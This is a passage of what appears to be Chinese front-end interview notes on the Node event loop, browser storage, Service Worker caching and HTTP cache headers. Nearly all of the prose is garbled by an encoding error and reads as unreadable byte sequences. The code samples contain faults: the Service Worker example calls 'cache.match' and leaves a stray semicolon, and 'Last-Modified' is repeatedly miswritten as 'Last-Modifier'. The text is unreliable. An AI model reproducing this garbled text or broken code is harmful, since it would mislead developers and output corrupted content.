é˜¶æ®µä¼šæ‰§è¡Œé™¤äº† close äº‹ä»¶ï¼Œå®šæ—¶å™¨å’Œ setImmediate çš„å›žè°ƒ idle,prepareidleï¼Œprepare é˜¶æ®µå†…éƒ¨å®žçŽ° pollpoll é˜¶æ®µå¾ˆé‡è¦ï¼Œåœ¨è¿™ä¸€é˜¶æ®µä¸­ï¼Œç³»ç»Ÿä¼šåšä¸¤ä»¶äº‹æƒ… æ‰§è¡Œåˆ°ç‚¹çš„å®šæ—¶å™¨ æ‰§è¡Œ poll é˜Ÿåˆ—ä¸­çš„äº‹ä»¶ å¹¶ä¸”å½“ poll ä¸­æ²¡æœ‰å®šæ—¶å™¨çš„æƒ…å†µä¸‹ï¼Œä¼šå‘çŽ°ä»¥ä¸‹ä¸¤ä»¶äº‹æƒ… å¦‚æžœpollé˜Ÿåˆ—ä¸ä¸ºç©ºï¼Œä¼šéåŽ†å›žè°ƒé˜Ÿåˆ—å¹¶åŒæ­¥æ‰§è¡Œï¼Œç›´åˆ°é˜Ÿåˆ—ä¸ºç©ºæˆ–è€…ç³»ç»Ÿé™åˆ¶ å¦‚æžœpollé˜Ÿåˆ—ä¸ºç©º,ä¼šå‘ç”Ÿä¸¤ä»¶äº‹æƒ… å¦‚æžœæœ‰ setImmediate éœ€è¦æ‰§è¡Œçš„æ—¶å€™ï¼Œpoll é˜¶æ®µä¼šåœæ­¢å¹¶ä¸”è¿›å…¥åˆ° check é˜¶æ®µæ‰§è¡Œ setImmediate å¦‚æžœæ²¡æœ‰ setImmediate éœ€è¦æ‰§è¡Œï¼Œä¼šç­‰å¾…å›žè°ƒè¢«åŠ å…¥åˆ°é˜Ÿåˆ—ä¸­å¹¶ç«‹å³æ‰§è¡Œå›žè°ƒ checkcheck é˜¶æ®µæ‰§è¡Œ setImmediate close callbacksclose callbacks é˜¶æ®µæ‰§è¡Œ close äº‹ä»¶ å¹¶ä¸”åœ¨ Node ä¸­ï¼Œæœ‰äº›æƒ…å†µä¸‹çš„å®šæ—¶å™¨æ‰§è¡Œé¡ºåºæ˜¯éšæœºçš„ 12345678910setTimeout(()=&gt;&#123; console.log('setTimeout'); &#125;,0)setImmediate(()=&gt;&#123; console.log('setImmediate');&#125;)// è¿™é‡Œå¯èƒ½ä¼šè¾“å‡º setTimeoutï¼ŒsetImmediate// å¯èƒ½ä¹Ÿä¼šç›¸åçš„è¾“å‡ºï¼Œè¿™å–å†³äºŽæ€§èƒ½// å› ä¸ºå¯èƒ½è¿›å…¥ event loop ç”¨äº†ä¸åˆ° 1 æ¯«ç§’ï¼Œè¿™æ—¶å€™ä¼šæ‰§è¡Œ setImmediate// å¦åˆ™ä¼šæ‰§è¡Œ setTimeout å½“ç„¶åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ‰§è¡Œé¡ºåºæ˜¯ç›¸åŒçš„ 1234567891011121314var fs = require('fs')fs.readFile(__filename, () =&gt; &#123; setTimeout(() =&gt; &#123; console.log('timeout') &#125;, 0) setImmediate(() =&gt; &#123; console.log('immediate') &#125;)&#125;)// å› ä¸º readFile çš„å›žè°ƒåœ¨ poll ä¸­æ‰§è¡Œ// å‘çŽ°æœ‰ setImmediate ï¼Œæ‰€ä»¥ä¼šç«‹å³è·³åˆ° check é˜¶æ®µæ‰§è¡Œå›žè°ƒ// å†åŽ» timer é˜¶æ®µæ‰§è¡Œ setTimeout// æ‰€ä»¥ä»¥ä¸Šè¾“å‡ºä¸€å®šæ˜¯ setImmediateï¼ŒsetTimeout ä¸Šé¢ä»‹ç»çš„éƒ½æ˜¯ macrotask çš„æ‰§è¡Œæƒ…å†µï¼Œmicrotask ä¼šåœ¨ä»¥ä¸Šæ¯ä¸ªé˜¶æ®µå®ŒæˆåŽç«‹å³æ‰§è¡Œã€‚ 1234567891011121314151617181920setTimeout(() =&gt; &#123; console.log('timer1') Promise.resolve().then(function() &#123; console.log('promise1') &#125;)&#125;, 0)setTimeout(() =&gt; &#123; console.log('timer2') Promise.resolve().then(function() &#123; console.log('promise2') &#125;)&#125;, 0)// ä»¥ä¸Šä»£ç åœ¨æµè§ˆå™¨å’Œ node ä¸­æ‰“å°æƒ…å†µæ˜¯ä¸åŒçš„// æµè§ˆå™¨ä¸­ä¸€å®šæ‰“å° timer1, promise1, timer2, promise2// node ä¸­å¯èƒ½æ‰“å° timer1, timer2, promise1, promise2// ä¹Ÿå¯èƒ½æ‰“å° timer1, promise1, timer2, promise2 Node ä¸­çš„ process.nextTick ä¼šå…ˆäºŽå…¶ä»– microtask æ‰§è¡Œã€‚ 123456789101112setTimeout(() =&gt; &#123; console.log('timer1') Promise.resolve().then(function() &#123; console.log('promise1') &#125;)&#125;, 0)process.nextTick(() =&gt; &#123; console.log('nextTick')&#125;)// nextTick, timer1, promise1 å­˜å‚¨cookie,localStorage,sessionStorage,indexDB ç‰¹æ€§ cookie localStorage sessionStorage indexDB æ•°æ®ç”Ÿå‘½å‘¨æœŸ ä¸€èˆ¬ç”±æœåŠ¡å™¨ç”Ÿæˆï¼Œå¯ä»¥è®¾ç½®è¿‡æœŸæ—¶é—´ é™¤éžè¢«æ¸…ç†ï¼Œå¦åˆ™ä¸€ç›´éƒ½åœ¨ é¡µé¢å…³é—­å°±æ¸…ç† é™¤éžè¢«å¤„ç†ï¼Œå¦åˆ™ä¸€ç›´éƒ½åœ¨ æ•°æ®å­˜å‚¨å¤§å° 4K 5M 5M æ— é™ ä¸ŽæœåŠ¡ç«¯é€šä¿¡ æ¯æ¬¡éƒ½ä¼šæºå¸¦åœ¨ header ä¸­ï¼Œå¯¹äºŽè¯·æ±‚æ€§èƒ½å½±å“ ä¸å‚ä¸Ž ä¸å‚ä¸Ž ä¸å‚ä¸Ž cookie ä¸å»ºè®®ç”¨äºŽå­˜å‚¨ï¼Œå¦‚æžœæ²¡æœ‰å¤§é‡çš„æ•°æ®å­˜å‚¨éœ€æ±‚çš„è¯ï¼Œå¯ä»¥ä½¿ç”¨ localStorage å’Œ sessionStorageã€‚å¯¹äºŽä¸æ€Žä¹ˆæ”¹å˜çš„æ•°æ®ä½¿ç”¨ localStorage å­˜å‚¨ï¼Œå¦åˆ™å¯ä»¥ç”¨ sessionStorage å­˜å‚¨ã€‚ å¯¹äºŽ cookie æˆ‘ä»¬è¿˜éœ€è¦ æ³¨æ„å®‰å…¨æ€§ å±žæ€§ ä½œç”¨ value å¦‚æžœç”¨äºŽä¿å­˜ç”¨æˆ·ç™»å½•çŠ¶æ€ï¼Œåº”è¯¥å°†è¯¥å€¼åŠ å¯†ï¼Œä¸èƒ½ä½¿ç”¨æ˜Žæ–‡çš„ç”¨æˆ·æ ‡è¯† http-only ä¸èƒ½é€šè¿‡ JS è®¿é—® Cookieï¼Œå‡å°‘ XSS æ”»å‡» secure åªèƒ½åœ¨åè®®ä¸º HTTPS çš„è¯·æ±‚ä¸­æºå¸¦ same-site è§„å®šæµè§ˆå™¨ä¸èƒ½åœ¨è·¨åŸŸè¯·æ±‚ä¸­æºå¸¦ Cookieï¼Œå‡å°‘ CSRF æ”»å‡» Service Worker Service Worker æ˜¯è¿è¡Œåœ¨æµè§ˆå™¨åŽé¢çš„ç‹¬ç«‹çº¿ç¨‹ï¼Œä¸€èˆ¬å¯ä»¥ç”¨æ¥å®žçŽ°ç¼“å­˜åŠŸèƒ½ï¼Œä½¿ç”¨ Service Worker ä¼ è¾“åè®®å¿…é¡»ä¸º HTTPSï¼Œä»¥ä¸º Service Worker ä¸­æ¶‰åŠåˆ°æ‹¦æˆªï¼Œæ‰€ä»¥å¿…é¡»ä½¿ç”¨ HTTPS åè®®æ¥ä¿éšœå®‰å…¨ã€‚ Service Worker å®žçŽ°ç¼“å­˜åŠŸèƒ½ä¸€èˆ¬åˆ†æˆä¸‰ä¸ªæ­¥éª¤ï¼šé¦–å…ˆä½ éœ€è¦å…ˆæ³¨å†Œ Service Worker ï¼Œç„¶åŽç›‘å¬åˆ° install äº‹ä»¶ä»¥åŽå°±å¯ä»¥ç¼“å­˜éœ€è¦çš„æ–‡ä»¶ï¼Œé‚£ä¹ˆåœ¨ä¸‹æ¬¡ç”¨æˆ·è®¿é—®çš„æ—¶å€™å°±å¯ä»¥é€šè¿‡æ‹¦æˆªè¯·æ±‚çš„æ–¹å¼æŸ¥æ‰¾æ˜¯å¦å­˜åœ¨ç¼“å­˜ã€‚ï¼Œå­˜åœ¨ç¼“å­˜çš„è¯å°±å¯ä»¥ç›´æŽ¥è¯»å–ç¼“å­˜æ–‡ä»¶ï¼Œå¦åˆ™å°±åŽ»è¯·æ±‚æ•°æ®ï¼Œä¸‹é¢æ˜¯è¿™ä¸ªæ­¥éª¤çš„å®žçŽ°ï¼š 123456789101112131415161718192021222324252627282930// index.jsif(navigator.serviceWorker)&#123; navigator.serviceWorker.register('sw.js') .then(function(registration)&#123; console.log('service worker æ³¨å†ŒæˆåŠŸ'); &#125;).catch(function(err)&#123; console.log('service worker æ³¨å†Œå¤±è´¥'); &#125;);&#125;// sw.js// ç›‘å¬ install äº‹ä»¶ï¼Œå›žè°ƒä¸­ç¼“å­˜æ‰€éœ€æ–‡ä»¶self.addEventListener('install',e=&gt;&#123; e.waitUntil( caches.open('my-cache').then(function(cache)&#123; return cache.addAll(['./index.html','./index.js']) &#125;); )&#125;);// æ‹¦æˆªæ‰€æœ‰è¯·æ±‚// å¦‚æžœç¼“å­˜ä¸­å·²ç»æœ‰è¯·æ±‚çš„æ•°æ®å°±ç›´æŽ¥ç”¨ç¼“å­˜ï¼Œå¦åˆ™å°±åŽ»è¯·æ±‚æ•°æ®self.addEventListener('fetch',e=&gt;&#123; e.respondWith( cache.match(e.request).then(function(response)&#123; if(response) return response; console.log('fetch source'); &#125;) )&#125;); è¿™ä¸ªå†…å®¹åœ¨ æˆ‘çš„ä¸€ç¯‡ webpack4.xä»ŽåŸºç¡€åˆ°å®žæˆ˜ç¬”è®°ä¸­ä¹Ÿæœ‰æåŠ ç¼“å­˜æœºåˆ¶æ€§èƒ½ä¼˜åŒ–é¢†åŸŸç›¸å…³é¢è¯•é¢˜ç›® ç¼“å­˜æ˜¯æ€§èƒ½ä¼˜åŒ–ä¸­ç®€å•é«˜æ•ˆçš„ä¸€ç§ä¼˜åŒ–æ–¹å¼ï¼Œå¯ä»¥æ˜¾è‘—å‡å°‘ç½‘ç»œä¼ è¾“å¸¦æ¥çš„æŸè€— å¯¹äºŽä¸€ä¸ªæ•°æ®æ¥è¯´ï¼Œå¯ä»¥åˆ†æˆç½‘ç»œè¯·æ±‚ï¼ŒåŽç«¯å¤„ç†ï¼Œæµè§ˆå™¨å“åº”ä¸‰ä¸ªæ­¥éª¤ã€‚æµè§ˆå™¨ç¼“å­˜å¯ä»¥å¸®åŠ©æˆ‘ä»¬åœ¨ç¬¬ä¸€æ­¥å’Œç¬¬ä¸‰æ­¥ä¸­ä¼˜åŒ–æ€§èƒ½ã€‚å¦‚æžœç›´æŽ¥ä½¿ç”¨ç¼“å­˜è€Œä¸å‘èµ·è¯·æ±‚ï¼Œæˆ–è€…å‘é€äº†è¯·æ±‚ä½†æ˜¯åŽç«¯å­˜å‚¨çš„æ•°æ®å’Œå‰ç«¯çš„ä¸€æ ·ï¼Œé‚£ä¹ˆå°±æ²¡æœ‰å¿…è¦å†å°†æ•°æ®å›žä¼ è¿‡æ¥ï¼Œè¿™æ ·å°±å‡å°‘äº†å“åº”æ•°æ®ã€‚ å¯ä»¥åˆ†å‡ ä¸ªéƒ¨åˆ†æ¥è®²è¿™ä¸ªæµè§ˆå™¨ç¼“å­˜æœºåˆ¶ï¼š ç¼“å­˜ä½ç½® Service Worker Memory Cache Disk Cache Push Cache ç½‘ç»œè¯·æ±‚ Service Worker Service Worker çš„ç¼“å­˜ä¸Žæµè§ˆå™¨ä¸­å…¶ä»–å†…å»ºçš„ç¼“å­˜æœºåˆ¶æ˜¯ä¸åŒçš„ï¼Œå®ƒå¯ä»¥è®©æˆ‘ä»¬è‡ªç”±æŽ§åˆ¶ç¼“å­˜æ–‡ä»¶ï¼Œå¦‚ä½•åŒ¹é…ã€è¯»å–ç¼“å­˜ï¼Œå¹¶ä¸”ç¼“å­˜æ˜¯æŒç»­æ€§çš„ã€‚ å½“ Service Worker æ²¡æœ‰å‘½ä¸­ç¼“å­˜çš„æ—¶å€™ï¼Œæˆ‘ä»¬éœ€è¦åŽ»è°ƒç”¨ fetch å‡½æ•°èŽ·å–æ•°æ®ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æžœæˆ‘ä»¬æ²¡æœ‰åœ¨ Service Worker å‘½ä¸­ç¼“å­˜çš„è¯ï¼Œä¼šæ ¹æ®ç¼“å­˜ä¼˜å…ˆçº§åŽ»æŸ¥æ‰¾æ•°æ®ã€‚ä½†æ˜¯ä¸ç®¡æˆ‘ä»¬æ˜¯ä»Ž Memory Cache ä¸­è¿˜æ˜¯ä»Žç½‘ç»œè¯·æ±‚ä¸­èŽ·å–çš„æ•°æ®ï¼Œæµè§ˆå™¨éƒ½ä¼šæ˜¾ç¤ºæˆ‘ä»¬æ˜¯ä»Ž Service Worker ä¸­èŽ·å–çš„å†…å®¹ã€‚ Memory Cache Memory Cache ä¹Ÿå°±æ˜¯å†…å­˜ä¸­çš„ç¼“å­˜ï¼Œè¯»å–å†…å­˜ä¸­çš„æ•°æ®è‚¯å®šæ¯”ç£ç›˜çš„å—ã€‚ä½†æ˜¯å†…å­˜ç¼“å­˜è™½ç„¶è¯»å–é«˜æ•ˆï¼Œå¯æ˜¯ç¼“å­˜æŒç»­æ€§å¾ˆçŸ­ï¼Œä¼šéšç€è¿›ç¨‹çš„é‡Šæ”¾è€Œé‡Šæ”¾ï¼Œä¸€æ—¦æˆ‘ä»¬å…³é—­äº† Tag é¡µé¢ï¼Œå†…å­˜ä¸­çš„ç¼“å­˜ä¹Ÿå°±è¢«é‡Šæ”¾äº†ã€‚ Dish Cache Disk Cache ä¹Ÿå°±æ˜¯å­˜å‚¨åœ¨ç¡¬ç›˜ä¸­çš„ç¼“å­˜ï¼Œè¯»å–é€Ÿåº¦æ˜¯æ…¢ç‚¹ï¼Œä½†æ˜¯ä»€ä¹ˆéƒ½èƒ½å­˜å‚¨åœ¨ç£ç›˜ä¸­ï¼Œä¸Ž Memory Cache ç›¸æ¯”èƒœåœ¨å®¹é‡å’Œ å­˜å‚¨æ—¶æ•ˆæ€§ä¸Šé¢ã€‚ åœ¨æ‰€æœ‰æµè§ˆå™¨ä¸­ï¼ŒDisk Cache è¦†ç›–é¢åŸºæœ¬æ˜¯æœ€å¤§çš„ï¼Œå®ƒä¼šæ ¹æ® HTTP Header ä¸­çš„å­—æ®µæ¥åˆ¤æ–­å“ªäº›èµ„æºéœ€è¦ç¼“å­˜ï¼Œå“ªäº›èµ„æºå¯ä»¥ä¸è¯·æ±‚ç›´æŽ¥ä½¿ç”¨ï¼Œå“ªäº›èµ„æºå·²ç»è¿‡æœŸéœ€è¦é‡æ–°è¯·æ±‚ã€‚å¹¶ä¸”åŠæ—¶åœ¨è·¨ç«™ç‚¹çš„æƒ…å†µä¸‹ï¼Œç›¸åŒåœ°å€çš„èµ„æºä¸€æ—¦è¢«ç¡¬ç›˜ç¼“å­˜ä¸‹æ¥ï¼Œå°±ä¸ä¼šå†æ¬¡åŽ»è¯·æ±‚æ•°æ®ã€‚ Push Cache Push Cache æ˜¯ HTTP/2 ä¸­çš„å†…å®¹ã€‚å½“ä»¥ä¸Šä¸‰ç§ç¼“å­˜éƒ½æ²¡æœ‰å‘½ä¸­æ—¶æ‰ä¼šè¢«ä½¿ç”¨ï¼Œå¹¶ä¸”ç¼“å­˜æ—¶é—´ä¹Ÿå¾ˆçŸ­æš‚ï¼Œåªä¼šåœ¨ä¼šè¯ ï¼ˆsessionï¼‰ä¸­å­˜åœ¨ï¼Œä¸€æ—¦ä¼šè¯ç»“æŸä¾¿ä¼šè¢«é‡Šæ”¾ã€‚ æ‰€æœ‰çš„èµ„æºéƒ½èƒ½è¢«æŽ¨é€ï¼Œä½†æ˜¯ Edge å’Œ Safari æµè§ˆå™¨å…¼å®¹æ€§ä¸æ€Žä¹ˆå¥½ å¯ä»¥æŽ¨é€ no-cache å’Œ no-store çš„èµ„æº ä¸€æ—¦è¿žæŽ¥è¢«å…³é—­ï¼ŒPush Cache å°±è¢«é‡Šæ”¾ å¤šä¸ªé¡µé¢å¯ä»¥ä½¿ç”¨ç›¸åŒçš„ HTTP/2 è¿žæŽ¥ï¼Œä¹Ÿå°±æ˜¯è¯´èƒ½ä½¿ç”¨åŒæ ·çš„ç¼“å­˜ Push Cache ä¸­çš„ç¼“å­˜åªèƒ½è¢«ä½¿ç”¨ä¸€æ¬¡ æµè§ˆå™¨å¯ä»¥æ‹’ç»æŽ¥å—å·²ç»å­˜åœ¨çš„èµ„æºæŽ¨é€ ä½ å¯ä»¥ç»™å…¶ä»–åŸŸåæŽ¨é€èµ„æº HTTP/2 push is tougher than I thought ç½‘ç»œè¯·æ±‚ å¦‚æžœæ‰€æœ‰ç¼“å­˜éƒ½æ²¡æœ‰å‘½ä¸­çš„è¯ï¼Œé‚£ä¹ˆåªèƒ½å‘èµ·ç½‘ç»œè¯·æ±‚æ¥èŽ·å–èµ„æºäº†ã€‚ åœ¨æ€§èƒ½ä¸Šé¢è€ƒè™‘ï¼Œå¤§éƒ¨åˆ†æŽ¥å£éƒ½åº”è¯¥é€‰æ‹©å¥½ç¼“å­˜ç­–ç•¥ ç¼“å­˜ç­–ç•¥é€šå¸¸æµè§ˆå™¨çš„ç¼“å­˜ç­–ç•¥åˆ†æˆä¸¤ç§ï¼Œå¼ºç¼“å­˜å’Œåå•†ç¼“å­˜ï¼Œå¹¶ä¸”ç¼“å­˜ç­–ç•¥éƒ½æ˜¯é€šè¿‡è®¾ç½® HTTP Header æ¥å®žçŽ°çš„ã€‚ å¼ºç¼“å­˜ å¼ºç¼“å­˜å¯ä»¥è®¾ç½®ä¸¤ç§ HTTP Header æ¥å®žçŽ°ï¼šExpires å’Œ Cache-Controlã€‚å¼ºç¼“å­˜è¡¨ç¤ºåœ¨ç¼“å­˜æœŸé—´ä¸éœ€è¦è¯·æ±‚ï¼Œstate code ä¸º 200 Expires 1Expires: Sat,20,Apr 2019 10:06:00 GMT Expires æ˜¯ HTTP/1 çš„äº§ç‰©ï¼Œè¡¨ç¤ºèµ„æºä¼šåœ¨ Sat,20,Apr 2019 10:06:00 GMT åŽè¿‡æœŸï¼Œéœ€è¦å†æ¬¡è¯·æ±‚ã€‚å¹¶ä¸” Expires å—é™äºŽæœ¬åœ°æ—¶é—´ï¼Œå¦‚æžœä¿®æ”¹äº†æœ¬åœ°æ—¶é—´ï¼Œå¯èƒ½ä¼šé€ æˆç¼“å­˜å¤±æ•ˆã€‚ Cache-Control 1Cache-Control:max-age=30 Cache-Control å‡ºçŽ°äºŽ HTTP/1.1ï¼Œä¼˜å…ˆçº§é«˜äºŽ Expiresï¼Œè¯¥å±žæ€§å€¼è¡¨ç¤ºèµ„æºä¼šåœ¨ 30ç§’åŽè¿‡åŽ»ï¼Œéœ€è¦å†æ¬¡è¯·æ±‚ã€‚ Cache-Control å¯ä»¥åœ¨è¯·æ±‚å¤´æˆ–è€…å“åº”å¤´ä¸­è®¾ç½®ï¼Œå¹¶ä¸”å¯ä»¥ç»„åˆä½¿ç”¨å¤šç§æŒ‡ä»¤ã€‚æ¯”å¦‚å¸Œæœ›èµ„æºèƒ½è¢«ç¼“å­˜ä¸‹æ¥ï¼Œå¹¶ä¸”æ˜¯å®¢æˆ·ç«¯æ˜¯ä»£ç†æœåŠ¡å™¨éƒ½èƒ½ç¼“å­˜ï¼Œè¿˜èƒ½è®¾ç½®ç¼“å­˜å¤±æ•ˆæ—¶é—´ç­‰ã€‚ æŒ‡ä»¤ ä½œç”¨ public è¡¨ç¤ºå“åº”å¯ä»¥è¢«å®¢æˆ·ç«¯å’Œä»£ç†æœåŠ¡å™¨ç¼“å­˜ private è¡¨ç¤ºå“åº”åªå¯ä»¥è¢«å®¢æˆ·ç«¯ç¼“å­˜ max-age=30 ç¼“å­˜30ç§’åŽå¤±æ•ˆï¼Œéœ€è¦é‡æ–°è¯·æ±‚ s-maxage=30 è¦†ç›– max-age ä½œç”¨æ˜¯ä¸€æ ·çš„ï¼Œåªåœ¨ä»£ç†æœåŠ¡å™¨ä¸­ç”Ÿæ•ˆ no-store ä¸ç¼“å­˜ä»»ä½•å“åº” no-cache èµ„æºè¢«ç¼“å­˜ï¼Œä½†æ˜¯ç«‹å³å¤±æ•ˆï¼Œä¸‹æ¬¡ä¼šå‘èµ·è¯·æ±‚éªŒè¯èµ„æºæ˜¯å¦è¿‡æœŸ max-stale=30 30ç§’å†…ï¼Œå³ä½¿ç¼“å­˜å¤±æ•ˆäº†ï¼Œä¹Ÿä½¿ç”¨è¯¥ç¼“å­˜ min-fresh=30 å¸Œæœ›30ç§’å†…èŽ·å–æœ€æ–°çš„å“åº” åå•†ç¼“å­˜ å¦‚æžœç¼“å­˜è¿‡æœŸäº†ï¼Œå°±éœ€è¦å‘èµ·è¯·æ±‚éªŒè¯èµ„æºæ˜¯å¦éœ€è¦æ›´æ–°ã€‚åå•†ç¼“å­˜å¯ä»¥é€šè¿‡è®¾ç½®ä¸¤ç§ Http header æ¥å®žçŽ°ï¼šLast-Modifier å’Œ ETag å½“æµè§ˆå™¨å‘èµ·è¯·æ±‚éªŒè¯èµ„æºçš„æ—¶å€™ï¼Œå¦‚æžœèµ„æºæ²¡æœ‰åšæ”¹å˜ï¼Œé‚£ä¹ˆæœåŠ¡å™¨å°±ä¼šè¿”å›ž 304 çŠ¶æ€ç ï¼Œå¹¶ä¸”æ›´æ–°æµè§ˆå™¨ç¼“å­˜çš„æœ‰æ•ˆæœŸã€‚ Last-Modified å’Œ If-Modified-Since Last-Modified è¡¨ç¤ºæœ¬åœ°æ–‡ä»¶æœ€åŽä¿®æ”¹æ—¥æœŸã€‚If-Modifier-Since ä¼šå°† Last-Modifier çš„å€¼å‘é€ç»™æœåŠ¡å™¨ï¼Œè¯¢é—®æœåŠ¡å™¨åœ¨è¯¥æ—¥æœŸåŽèµ„æºæ˜¯å¦æœ‰æ›´æ–°ï¼Œæœ‰æ›´æ–°çš„è¯å°±ä¼šå°†æ–°çš„èµ„æºå‘é€å›žæ¥ï¼Œå¦åˆ™è¿”å›ž 304 çŠ¶æ€ç  ä½†æ˜¯ Last-Modifier å­˜åœ¨ä¸€äº›å¼Šç«¯ï¼š å¦‚æžœæœ¬åœ°æ‰“å¼€ç¼“å­˜æ–‡ä»¶ï¼Œå³ä½¿æ²¡æœ‰å¯¹æ–‡ä»¶è¿›è¡Œä¿®æ”¹ï¼Œä½†è¿˜æ˜¯ä¼šé€ æˆ Last-Modified è¢«ä¿®æ”¹ï¼ŒæœåŠ¡ç«¯ä¸èƒ½å‘½ä¸­ç¼“å­˜å¯¼è‡´å‘é€ç›¸åŒçš„èµ„æº å› ä¸º Last-Modified åªèƒ½ä»¥ç§’è®¡æ—¶ï¼Œå¦‚æžœåœ¨ä¸å¯æ„ŸçŸ¥çš„æ—¶é—´å†…ä¿®æ”¹å®Œæˆæ–‡ä»¶ï¼Œé‚£ä¹ˆæœåŠ¡ç«¯ä¼šè®¤ä¸ºèµ„æºè¿˜æ˜¯å‘½ä¸­äº†ï¼Œä¸ä¼šè¿”å›žæ­£ç¡®çš„èµ„æº å› ä¸ºè¿™äº›å¼Šç«¯æ‰€æœ‰å‡ºçŽ°äº† ETag ETag å’Œ If-None-Match ETag ç±»ä¼¼äºŽæ–‡ä»¶æŒ‡çº¹ï¼ŒIf-None-Match ä¼šå°†å½“å‰çš„ Etag å‘é€ç»™æœåŠ¡å™¨ï¼Œè¯¢é—®è¯¥èµ„æº ETag æ˜¯å¦å‘ç”Ÿäº†å˜åŒ–ï¼Œå¦‚æžœæœ‰å˜åŠ¨çš„è¯å°±å°†æ–°çš„èµ„æºå‘é€å›žæ¥ã€‚å¹¶ä¸” ETag çš„ä¼˜å…ˆçº§æ¯” Last-Modifier æžã€‚ é‚£ä¹ˆå¦‚æžœä»€ä¹ˆç¼“å­˜ç­–ç•¥éƒ½æ²¡æœ‰è®¾ç½®ï¼Œæµè§ˆå™¨ä¼šæ€Žä¹ˆå¤„ç†ï¼Ÿ å¯¹äºŽè¿™ç§æƒ…å†µï¼Œæµè§ˆå™¨ä¼šé‡‡ç”¨ä¸€ä¸ªå¯å‘å¼ç®—æ³•ï¼Œé€šå¸¸ä¼šå–å“åº”å¤´çš„ Date å‡åŽ» Last-Modifier å€¼çš„ 10% ä½œä¸ºç¼“å­˜æ—¶é—´ã€‚ å®žé™…åœºæ™¯å¼•ç”¨ç¼“å­˜ç­–ç•¥é¢‘ç¹å˜åŠ¨çš„èµ„æº é¦–å…ˆä½¿ç”¨ Cache-Controlï¼šno-cache ä½¿å¾—æµè§ˆå™¨æ¯æ¬¡éƒ½è¯·æ±‚æœåŠ¡å™¨ï¼Œç„¶åŽé…åˆ ETag å’Œ Last-Modifier æ¥éªŒè¯èµ„æºæ˜¯å¦æœ‰æ•ˆã€‚è¿™æ ·çš„åšæ³•è™½ç„¶ä¸èƒ½èŠ‚çœè¯·æ±‚æ•°é‡ï¼Œä½†æ˜¯èƒ½æ˜¾è‘—å‡å°‘å“åº”æ•°æ®å¤§å° ä»£ç æ–‡ä»¶ æŒ‡é™¤äº† HTML ä¹‹å¤–çš„ä»£ç çš„æ–‡ä»¶ã€‚å› ä¸ºHTML æ–‡ä»¶ä¸€èˆ¬ä¸ç¼“å­˜æˆ–è€…ç¼“å­˜æ—¶é—´å¾ˆçŸ­ã€‚ ä¸€èˆ¬æ¥è¯´ï¼Œéƒ½ä¼šä½¿ç”¨æ‰“åŒ…å·¥å…·ï¼Œwebpack ç­‰ç­‰æ¥å¯¹æ–‡ä»¶åè¿›è¡Œå“ˆå¸Œå¤„ç†ï¼Œåªæœ‰å½“ä»£ç ä¿®æ”¹è¿‡åŽæ‰ä¼šç”Ÿæˆæ–°çš„æ–‡ä»¶åã€‚è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ç»™æ–‡ä»¶è®¾ç½®ä¸€ä¸ªç¼“å­˜æœ‰æ•ˆæœŸä¸€å¹´ Cache-Control:max-age=31536000 è¿™æ ·å°±åªæœ‰å½“ HTML æ–‡ä»¶å¼•å…¥çš„æ–‡ä»¶åå‘ç”Ÿäº†æ”¹å˜çš„æ—¶å€™æ‰ä¼šåŽ»ä¸‹è½½æœ€æ–°çš„ä»£ç æ–‡ä»¶ï¼Œå¦åˆ™å°±ä¼šä¸€ç›´ä½¿ç”¨ç¼“å­˜ã€‚ å…¶ä»–ä¼˜åŒ–å…¶å®žé™¤äº†ç¼“å­˜çš„ä¼˜åŒ–å¯ä»¥è®©æ€§èƒ½æ˜¾è‘—æé«˜ï¼Œå¦å¤–ä¸€ä¸ªå¾ˆé‡è¦ç‚¹çš„æ˜¯åœ¨å¼€å‘é˜¶æ®µï¼Œå°½é‡ä½¿ç”¨æŒ‰éœ€åŠ è½½çš„åŽŸåˆ™æ¥å¼€å‘ï¼Œå¢žåŠ ä»£ç çš„ä½¿ç”¨çŽ‡ä»Žæºå¤´æ¥ä¼˜åŒ–æ€§èƒ½ï¼Œå¯èƒ½æ•ˆæžœä¼šæ›´åŠ æ˜¾è‘—ã€‚ åœ¨æµè§ˆå™¨åœ°å€æ é”®å…¥ URLï¼ŒæŒ‰ä¸‹å›žè½¦ä¹‹åŽä¼šç»åŽ†ä¸€ä¸‹æµç¨‹ è§£æž url åˆ° dns æœåŠ¡å™¨ dns æœåŠ¡å™¨è¿”å›ž ip åœ°å€åˆ°æµè§ˆå™¨ è·Ÿéšåè®®å°† ip å‘é€åˆ°ç½‘ç»œä¸­ ç»è¿‡å±€åŸŸç½‘è¾¾åˆ°æœåŠ¡å™¨ è¿›å…¥æœåŠ¡å™¨çš„ MVC æž¶æž„ controller ç»è¿‡é€»è¾‘å¤„ç†ï¼Œè¯·æ±‚åˆ†å‘ï¼Œè°ƒç”¨ Model Model ä¸Žæ•°æ® è¿›è¡Œäº¤äº’ï¼Œç„¶åŽè¯»å–æ•°æ®åº“ï¼Œå°†ç»“æžœé€šè¿‡ view å±‚è¿”å›žåˆ°ç½‘ç»œå›žåˆ°æµè§ˆå™¨ æµè§ˆå™¨æ ¹æ®è¯·æ±‚å›žæ¥çš„ html å’Œå…³è”çš„css js æ–‡ä»¶è¿›è¡Œæ¸²æŸ“ åœ¨æ¸²æŸ“çš„è¿‡ç¨‹ä¸­ï¼Œæµè§ˆå™¨æ ¹æ® html ç”Ÿæˆ dom æ ‘ï¼Œæ ¹æ® css ç”Ÿæˆ css æ ‘ å°† dom æ ‘å’Œ css æ ‘è¿›è¡Œæ•´åˆï¼Œæœ€ç»ˆçŸ¥é“ dom èŠ‚ç‚¹çš„æ ·å¼ï¼Œåœ¨é¡µé¢ä¸Šè¿›è¡Œæ ·å¼æ¸²æŸ“ æµè§ˆå™¨åŽ»æ‰§è¡Œ js è„šæœ¬ æœ€ç»ˆå±•ç¤ºé¡µé¢ æ¸²æŸ“æœºåˆ¶HTML=&gt;DOM æ ‘æ‰“å¼€ä¸€ä¸ªç½‘é¡µæ—¶ï¼Œæµè§ˆå™¨ä¼šåŽ»è¯·æ±‚å¯¹åº”çš„ HTML æ–‡ä»¶ï¼Œæ‹¿åˆ° JS/CSS/HTML æ–‡ä»¶çš„å­—ç¬¦ä¸²ï¼Œä½†æ˜¯è®¡ç®—æœºæ˜¯ä¸ç†è§£è¿™äº›å­—ç¬¦ä¸²çš„ï¼Œåœ¨ç½‘ç»œä¸­ä¼ è¾“çš„å†…å®¹éƒ½æ˜¯01 